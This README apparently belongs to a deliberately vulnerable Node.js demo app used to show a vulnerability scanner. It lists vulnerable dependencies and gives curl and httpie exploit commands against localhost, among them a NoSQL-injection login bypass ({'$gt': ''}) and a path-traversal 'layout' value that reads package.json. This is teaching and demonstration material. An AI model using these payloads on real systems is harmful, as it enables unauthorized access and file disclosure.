# Goof - Vulnmap's vulnerable demo app
[![Known Vulnerabilities](https://khulnasoft.com/test/github/vulnmap/goof/badge.svg?style=flat-square)](https://khulnasoft.com/test/github/vulnmap/goof)
...
git clone https://github.com/khulnasoft-labs/nodejs-goof
npm install
npm start
```
...
- [Mongoose - Buffer Memory Exposure](https://khulnasoft.com/vuln/npm:mongoose:20160116) - requires a version <= Node.js 8. For the exploit demo purposes, one can update the Dockerfile `node` base image to use `FROM node:6-stretch`.
- [st - Directory Traversal](https://khulnasoft.com/vuln/npm:st:20140206)
- [ms - ReDoS](https://khulnasoft.com/vuln/npm:ms:20151024)
- [marked - XSS](https://khulnasoft.com/vuln/npm:marked:20150520)
...
```sh
curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"username": "admin@khulnasoft.com.io", "password": "SuperSecretPassword"}' 'http://localhost:3001/login'
```

```sh
curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"email": "admin@khulnasoft.com.io", "firstname": "admin", "lastname": "admin", "country": "IL", "phone": "+972551234123",  "layout": "./../package.json"}' 'http://localhost:3001/account_details'
```
...
```sh
echo '{"username":"admin@khulnasoft.com.io", "password":"WrongPassword"}' | http --json $GOOF_HOST/login -v
```

And another request, as denoted with the following JSON request to sign-in as the admin user works as expected:
```sh
echo '{"username":"admin@khulnasoft.com.io", "password":"SuperSecretPassword"}' | http --json $GOOF_HOST/login -v
```
...
```sh
echo '{"username": "admin@khulnasoft.com.io", "password": {"$gt": ""}}' | http --json $GOOF_HOST/login -v
```
...
```bash
vulnmap test --docker node:6-stretch --file=Dockerfile
```

To monitor this image and receive alerts with Vulnmap:
```bash
vulnmap monitor --docker node:6-stretch
```

## Runtime Alerts

Vulnmap provides the ability to monitor application runtime behavior and detect an invocation of a function is known to be vulnerable and used within open source dependencies that the application makes use of.

The agent is installed and initialized in [app.js](./app.js#L5).

For the agent to report back to your vulnmap account on the vulnerabilities it detected it needs to know which project on Vulnmap to associate with the monitoring. Due to that, we need to provide it with the project id through an environment variable `VULNMAP_PROJECT_ID`

To run the Node.js app with runtime monitoring:
```bash
VULNMAP_PROJECT_ID=<PROJECT_ID> npm start
```
...
In this application, the default `vulnmap wizard` answers will fix all the issues.
